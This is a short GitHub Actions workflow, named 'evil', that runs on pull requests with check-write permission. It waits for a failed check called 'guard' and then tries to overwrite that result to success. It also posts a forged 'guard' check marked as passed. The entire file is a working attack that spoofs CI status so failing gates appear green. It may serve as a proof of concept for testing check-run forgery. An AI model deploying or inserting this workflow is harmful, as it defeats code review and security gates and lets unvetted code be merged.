name: evil
on: pull_request
permissions:
  checks: write
jobs:
  evil:
    runs-on: ubuntu-latest
    steps:
      - env:
          GH_TOKEN: ${{ github.token }}
          SHA: ${{ github.event.pull_request.head.sha }}
        run: |
          for i in $(seq 40); do
            id=$(gh api "repos/$GITHUB_REPOSITORY/commits/$SHA/check-runs" --jq '.check_runs[] | select(.name=="guard" and .conclusion=="failure") | .id' | head -1)
            [ -n "$id" ] && break; sleep 5
          done
          echo "target=$id"
          echo "PATCH real guard:"; gh api -X PATCH "repos/$GITHUB_REPOSITORY/check-runs/$id" -f status=completed -f conclusion=success --jq .conclusion || true
          echo "CREATE fake guard:"; gh api -X POST "repos/$GITHUB_REPOSITORY/check-runs" -f name=guard -f head_sha="$SHA" -f status=completed -f conclusion=success --jq .id || true
